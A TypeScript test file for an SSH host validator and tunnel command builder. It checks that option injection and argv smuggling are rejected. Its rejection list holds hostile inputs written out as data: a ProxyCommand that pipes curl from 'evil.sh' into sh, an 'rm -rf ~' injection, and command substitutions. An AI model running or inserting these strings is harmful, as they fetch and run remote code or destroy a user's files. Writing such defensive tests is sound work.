import { describe, expect, test } from "bun:test";
import { tunnelCommand, validateSshTarget } from "./ssh-target";

describe("validateSshTarget (config.yaml host is untrusted input)", () => {
  test("accepts plain hosts, aliases, and FQDNs", () => {
    expect(validateSshTarget("devbox")).toEqual({ host: "devbox" });
    expect(validateSshTarget("node-1.internal.example.com")).toEqual({
      host: "node-1.internal.example.com",
    });
    expect(validateSshTarget("  devbox  ")).toEqual({ host: "devbox" });
  });

  test("rejects option injection and argv smuggling", () => {
    for (const evil of [
      "-oProxyCommand=curl evil.sh|sh",
      "-J attacker@host",
      "devbox -oProxyCommand=x",
      "devbox;rm -rf ~",
      "devbox`id`",
      "devbox$(id)",
      "devbox\nmalicious",
      "devbox host2",
      "user@devbox",
      "",
      null,
      undefined,
    ]) {
      expect(validateSshTarget(evil as never)).toBeNull();
    }
  });

  test("rejects overlong hosts", () => {
    expect(validateSshTarget("a".repeat(254))).toBeNull();
  });
});

describe("tunnelCommand", () => {
  test("array form, loopback both ends, BatchMode, destination fenced behind --", () => {
    const argv = tunnelCommand({ host: "devbox" }, 52700);
    expect(argv[0]).toBe("ssh");
    expect(argv).toContain("-N");
    expect(argv.join(" ")).toContain("BatchMode=yes");
    expect(argv.join(" ")).toContain("ExitOnForwardFailure=yes");
    expect(argv).toContain("127.0.0.1:52700:127.0.0.1:7070");
    expect(argv[argv.length - 2]).toBe("--");
    expect(argv[argv.length - 1]).toBe("devbox");
    expect(argv.join(" ")).not.toContain("StrictHostKeyChecking=no");
  });

  test("refuses privileged or nonsense local ports", () => {
    expect(() => tunnelCommand({ host: "devbox" }, 80)).toThrow();
    expect(() => tunnelCommand({ host: "devbox" }, 70000)).toThrow();
    expect(() => tunnelCommand({ host: "devbox" }, 1.5 as never)).toThrow();
  });
});
